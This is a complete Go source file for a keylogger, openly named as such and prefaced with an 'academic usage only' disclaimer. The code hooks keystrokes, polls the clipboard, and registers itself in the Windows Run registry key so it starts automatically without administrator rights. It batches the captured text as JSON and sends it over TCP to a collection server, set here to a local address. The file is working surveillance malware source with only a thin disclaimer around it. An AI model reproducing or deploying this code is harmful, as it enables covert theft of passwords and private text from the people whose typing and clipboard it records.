// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

package main

import (
	"encoding/json"
	"fmt"
	"github.com/atotto/clipboard"
	hook "github.com/robotn/gohook"
	"golang.org/x/sys/windows/registry"
	"net"
	"os"
	"os/signal"
	"runtime"
	"time"
)

// KeyType is the alias of string
type KeyType string

const (
	Protocol = "tcp"
	Address  = "127.0.0.1:8722"

	KeyName = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	AppName = "Keylogger"

	OSWindows = "windows"
	OSLinux   = "linux"
	OSDarwin  = "darwin"

	TypeKeyboard  KeyType = "KBD"
	TypeClipboard KeyType = "CBD"
	TypeSpecial   KeyType = "SPC"

	// MaxLog controls the sending frequency. Set it to a small value for better demonstrating.
	// MaxLog = 64
	MaxLog = 4
)

type keyLog struct {
	Time  int64   `json:"time"`
	Type  KeyType `json:"type"`
	Value string  `json:"value"`
}

func newKeyLog(keyType KeyType, value string) keyLog {
	return keyLog{
		Time:  time.Now().UnixMilli(),
		Type:  keyType,
		Value: value,
	}
}

var keyLogs []keyLog

func main() {
	// Register autostart service.
	setAutostart()
	// Start a goroutine to listen clipboard.
	go listenClipboard()
	// Start a goroutine to listen keyboard.
	go listenKeyboard()
	// Start a goroutine to send logs.
	go autoSend()
	// Make a channel for receiving system signal.
	c := make(chan os.Signal)
	// Detect interrupt (ctrl+C) signal.
	signal.Notify(c, os.Interrupt)
	// Block until received interrupt signal.
	select {
	case <-c:
		// Send the residual logs.
		if len(keyLogs) > 0 {
			sendLogs()
		}
	}
}

// setAutostart registers autostart service on this device.
func setAutostart() {
	// According to the OS, use different strategy to register autostart.
	switch runtime.GOOS {
	case OSWindows:
		// Edit the registry table to register autostart service on Windows system.
		// Get full path of the current running program.
		filename := os.Args[0]
		// Open the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run key to read and edit.
		// Edit HKEY_CURRENT_USER instead of HKEY_LOCAL_MACHINE because it does not need administrator permission.
		key, _ := registry.OpenKey(registry.CURRENT_USER, KeyName, registry.ALL_ACCESS)
		defer key.Close()
		// Check if this program has been written to the registry.
		path, _, _ := key.GetStringValue(AppName)
		if path != filename {
			_ = key.SetStringValue(AppName, filename)
		}
	case OSLinux:
		// TODO: Register autostart on Linux
		// Idea: Edit the /etc/rc.d/rc.local
	case OSDarwin:
		// TODO: Register autostart on Mac OS
	default:
		// Does not support other platforms
	}
}

// listenClipboard listens and logs changes of clipboard.
func listenClipboard() {
	var text string
	for {
		// Read from clipboard.
		t, _ := clipboard.ReadAll()
		// If the clipboard is nonempty string or has been changed, log it.
		if t != text && t != "" {
			text = t
			keyLogs = append(keyLogs, newKeyLog(TypeClipboard, text))
		}
	}
}

// listenKeyboard listens and logs the events of keyboard.
func listenKeyboard() {
	evChan := hook.Start()
	defer hook.End()
	for ev := range evChan {
		// hook.Start() listens events including mouse and keyboard actions. Only character keys (letters, numbers,
		// symbols, space, enter, etc.) will call the hook.KeyDown event, others (ctrl, alt, f1, etc.) will not. Thus,
		// if detected characters typed, log it.
		if ev.Kind == hook.KeyDown {
			// Treat return (\r, enter on keyboard), backspace (\b), and tab (\t) as special keys.
			switch ev.Keychar {
			case '\r':
				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "enter"))
			case '\b':
				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "backspace"))
			case '\t':
				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "tab"))
			default:
				// When nothing logged or the last recorded character is not TypeKeyboard, append a new logKey object
				// directly. If it has recorded and the last recorded type is also TypeKeyboard, append the character to
				// the Value field of the last object.
				if len(keyLogs) == 0 {
					keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, fmt.Sprintf("%c", ev.Keychar)))
				} else {
					if keyLogs[len(keyLogs)-1].Type == TypeKeyboard {
						keyLogs[len(keyLogs)-1].Value += fmt.Sprintf("%c", ev.Keychar)
					} else {
						keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, fmt.Sprintf("%c", ev.Keychar)))
					}
				}
			}
		}
	}
}

// autoSend detects the length of logs and determines to send.
func autoSend() {
	for {
		// When have logged to the thresh, send and clear the recorded logs.
		if len(keyLogs) >= MaxLog {
			sendLogs()
		}
	}
}

// sendLogs sends keyLogs to the target server via TCP.
func sendLogs() {
	// Create TCP end point for dialing.
	laddr, _ := net.ResolveTCPAddr(Protocol, Address)
	// Dial to connect to the server.
	conn, err := net.DialTCP(Protocol, nil, laddr)
	if err != nil {
		return
	}
	defer conn.Close()
	// Serialise keyLog slice to JSON.
	bytes, _ := json.Marshal(keyLogs)
	// Send logs to the target server.
	_, _ = conn.Write(bytes)
	// Clear the keyLog slice.
	keyLogs = []keyLog{}
}
